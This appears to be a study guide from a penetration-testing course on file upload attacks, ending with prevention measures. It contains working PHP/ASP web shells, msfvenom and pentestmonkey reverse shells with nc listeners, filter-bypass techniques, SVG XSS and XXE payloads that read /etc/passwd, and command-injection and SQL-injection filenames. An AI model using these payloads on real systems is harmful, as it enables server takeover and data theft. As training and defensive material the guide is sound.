## Intro to File Upload Attacks

User file uploads let attackers store malicious data on the back-end server. Weak or missing validation can lead to arbitrary command execution, stored XSS, XXE, DoS, configuration overwrite, and other attacks.

### Types of File Upload Attacks

The worst case is unauthenticated arbitrary file upload: any user can upload any file type. Web shells and reverse shells are the primary RCE paths. Limited uploads can still be abused through XSS, XXE, DoS, overwriting critical files, and parser/library weaknesses. Outdated libraries can introduce file upload vulnerabilities even when upload code looks safe.

## Absent Validation

### Arbitrary File Upload

No front-end or back-end restrictions means any file type can be uploaded and executed.

### Identifying Web Framework

Web shells must match the server-side language. Identify the framework first.

Request common index extensions:

```text
http://<TARGET_IP>:<PORT>/index.php
http://<TARGET_IP>:<PORT>/index.asp
http://<TARGET_IP>:<PORT>/index.aspx
```

If `/index.php` returns the same page, the app is PHP. Burp Intruder with a web extensions wordlist can fuzz this. Web routes may hide extensions, so this is not always conclusive.

Wappalyzer, Burp scanners, and ZAP scanners can also identify languages, servers, and frameworks.

### Vulnerability Identification

Create a simple PHP test file:

```php
<?php echo "Hello HTB";?>
```

Upload it, then visit:

```text
http://<TARGET_IP>:<PORT>/uploads/test.php
```

Printed output means PHP executed. Printed source means the server did not execute PHP.

## Upload Exploitation

### Web Shells

phpbash provides a semi-interactive PHP web shell. SecLists web shells are under `/opt/useful/seclists/Web-Shells`.

Upload a PHP web shell, then visit:

```text
http://<TARGET_IP>:<PORT>/uploads/phpbash.php
```

### Writing Custom Web Shell

PHP:

```php
<?php system($_REQUEST['cmd']); ?>
```

Use:

```text
http://<TARGET_IP>:<PORT>/uploads/shell.php?cmd=id
```

Browser source view with `CTRL+U` often preserves command output formatting better than rendered HTML.

ASP:

```asp
<% eval request('cmd') %>
```

Web shells can fail when disabled functions or WAF rules block the execution functions.

### Reverse Shell

Use a PHP reverse shell such as pentestmonkey's. Set the local IP and port:

```php
$ip = '<OUR_IP>';     // CHANGE THIS
$port = <OUR_PORT>;   // CHANGE THIS
```

Listen:

```bash
nc -lvnp <OUR_PORT>
```

Upload the script and request it.

Reverse shells are preferred but may fail when egress traffic is filtered or connection functions are disabled.

### Generating Custom Reverse Shell Scripts

Generate a PHP reverse shell with msfvenom:

```bash
msfvenom -p php/reverse_php LHOST=<OUR_IP> LPORT=<OUR_PORT> -f raw > reverse.php
```

Listen:

```bash
nc -lvnp <OUR_PORT>
```

Upload `reverse.php` and request it.

## Client-Side Validation

### Client-Side Validation

A profile image upload may restrict the file dialog to jpg, jpeg, and png and show `Only images are allowed!` without sending a request. If no HTTP request occurs during validation, validation is client-side.

### Back-end Request Modification

Capture a normal image upload to `/upload.php`. Modify:

```text
filename="shell.php"
```

Replace the image body with the PHP web shell. Content-Type modification is not required at this stage.

Uploaded shell location:

```text
http://<TARGET_IP>:<PORT>/profile_images/shell.php?cmd=id
```

### Disabling Front-end Validation

Toggle Page Inspector with `CTRL+SHIFT+C`. The file input may look like:

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

Open the browser console with `CTRL+SHIFT+K` and inspect:

```javascript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```

Delete `checkFile(this)` from the input element. Removing `accept=".jpg,.jpeg,.png"` is optional. Changes are temporary and do not survive refresh.

After upload, inspect the image element:

```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

Use:

```text
http://<TARGET_IP>:<PORT>/profile_images/shell.php?cmd=id
```

Firefox steps differ slightly from Chrome, which may use overrides.

## Blacklist Filters

### Blacklisting Extensions

`Extension not allowed` indicates back-end extension filtering.

Example blacklist:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

The comparison is case-sensitive here. Windows file names are case-insensitive, so `pHp` may bypass and still execute.

### Fuzzing Extensions

Use PayloadsAllTheThings PHP/.NET extension lists or SecLists web extensions.

In Burp, send the upload request to Intruder. Clear positions. Mark only the extension in:

```text
filename="HTB.php"
```

Load the extension wordlist. Disable URL encoding so the dot remains raw. Start the attack and sort by Length. Responses such as `File successfully uploaded` with a distinct Content-Length, for example `193`, indicate allowed extensions.

### Non-Blacklisted Extensions

`.phtml` often executes PHP.

Send a successful Intruder request to Repeater. Change the filename:

```text
filename="shell.phtml"
```

Use PHP web shell content. Then visit:

```text
http://<TARGET_IP>:<PORT>/profile_images/shell.phtml?cmd=id
```

## Whitelist Filters

### Whitelisting Extensions

`Only images are allowed` may indicate a whitelist. Fuzzing may show PHP extensions blocked while other extensions upload successfully.

Weak whitelist regex:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

This checks whether the filename contains an allowed extension, not whether it ends with it.

### Double Extensions

Use an allowed extension before the PHP extension:

```text
shell.jpg.php
```

Upload PHP content. Then visit:

```text
http://<TARGET_IP>:<PORT>/profile_images/shell.jpg.php?cmd=id
```

Strict regex blocks this:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

### Reverse Double Extension

Apache PHP handler configuration may be flawed. Example `/etc/apache2/mods-enabled/php7.4.conf`:

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

Without an end anchor, any filename containing `.php`, `.phar`, or `.phtml` may execute PHP.

Use:

```text
shell.php.jpg
```

Then visit:

```text
http://<TARGET_IP>:<PORT>/profile_images/shell.php.jpg?cmd=id
```

### Character Injection

Characters to inject before or after extensions include `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`, and `:`.

`shell.php%00.jpg` can work on PHP 5.X and earlier because the null byte terminates the stored filename. Windows may accept `shell.aspx:.jpg` and store `shell.aspx`.

Generate filename permutations:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

Fuzz the generated list with Burp Intruder.

## Type Filters

### Content-Type

If extension tricks fail but the error remains the same, the app may validate content type.

PHP Content-Type check:

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

The browser sets this header client-side, so it can be changed in Burp.

Download and reduce the SecLists content-type list:

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

Set the file part header to an allowed type:

```text
Content-Type: image/jpg
```

Upload requests can contain two Content-Type headers: one for the full request and one for the attached file. Usually modify the file part. If the upload is sent as plain POST data, modify the main header.

### MIME-Type

MIME validation inspects file signatures, usually the first bytes. GIF signatures are `GIF87a` and `GIF89a`; `GIF8` is often enough.

Check MIME interpretation:

```bash
echo "this is a text file" > text.jpg
file text.jpg
```

Change the magic bytes:

```bash
echo "GIF8" > text.jpg
file text.jpg
```

PHP MIME check:

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Place `GIF8` before the PHP code while keeping a `.php` extension. Command output may begin with `GIF8` because it is printed before PHP execution.

Combine extension, Content-Type, and MIME permutations to confuse weaker filters.

## Limited File Uploads

Secure filters may prevent arbitrary uploads but still allow dangerous file types such as SVG, HTML, XML, images, and documents.

### XSS

HTML uploads can contain JavaScript and support XSS or CSRF.

Image metadata XSS:

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg
```

If metadata is displayed, the payload executes. Changing the image MIME type to `text/html` may cause the server or browser to treat it as HTML.

SVG XSS payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

### XXE

SVG XXE reading `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

SVG XXE reading PHP source through base64:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Source disclosure supports whitebox testing: finding upload directories, allowed extensions, naming schemes, and further vulnerabilities.

PDF, Word, and PowerPoint files also contain XML. Vulnerable document processors can expose XXE or SSRF through uploaded documents.

### DoS

XXE entity-expansion payloads can cause DoS. ZIP decompression bombs can crash servers that automatically extract archives. Pixel flood attacks modify JPG/PNG compression data to claim sizes such as `0xffff x 0xffff`, forcing huge memory allocation. Overly large uploads can fill disk. Directory traversal uploads such as `../../../etc/passwd` may also destabilize the server.

## Other Upload Attacks

### Injections in File Name

Malicious filenames can trigger command injection, XSS, or SQL injection when reflected or processed.

Command injection filenames:

```text
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
```

XSS filename:

```text
<script>alert(window.origin);</script>
```

SQL injection filename:

```text
file';select+sleep(5);--.jpg
```

### Upload Directory Disclosure

Find upload directories through fuzzing, LFI, XXE, source disclosure, or IDOR techniques.

Force errors by uploading duplicate filenames, sending identical requests simultaneously, or using very long filenames, for example 5,000 characters. Error messages may reveal the upload path.

### Windows-specific Attacks

Reserved characters such as `|`, `<`, `>`, `*`, and `?` may cause errors that disclose paths. Reserved names such as `CON`, `COM1`, `LPT1`, and `NUL` may prevent file writes and trigger errors.

Windows 8.3 filename convention uses tildes. `HAC~1.TXT` can refer to `hackthebox.txt`. A file named `WEB~1.CON` may overwrite `web.conf`.

### Advanced File Upload Attacks

Automatic processing of uploads, such as transcoding, compression, renaming, or parsing, can introduce vulnerabilities. Public examples include ffmpeg AVI upload XXE. Custom libraries may require source review and advanced testing.

## Preventing File Upload Vulnerabilities

### Extension Validation

Whitelist allowed extensions and blacklist dangerous extensions. Blacklists should match the extension anywhere in the filename; whitelists should anchor to the final extension.

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist test
if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

Apply validation on the back-end and front-end. Front-end validation is bypassable but reduces accidental bad uploads.

### Content Validation

Validate extension and content together. Confirm the extension matches the Content-Type header and the detected MIME type.

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}
```

### Upload Disclosure

Hide the uploads directory. Serve files through a controlled `download.php` script. Enforce authorization and strict path validation to prevent IDOR and LFI. Return `403` for direct requests to the uploads directory.

Serve downloads with `Content-Disposition: attachment`, an explicit `Content-Type`, and `X-Content-Type-Options: nosniff`.

Randomize stored filenames and keep sanitized original names in the database. Store uploads on a separate server or container. Restrict PHP filesystem access with `open_basedir`.

### Further Security

Disable dangerous PHP functions in `php.ini` with `disable_functions=exec,shell_exec,system,passthru`. Handle errors at the application level and avoid exposing raw server errors, filenames, or upload paths. Limit file size, update libraries, scan uploads for malware, and use a WAF as an additional layer.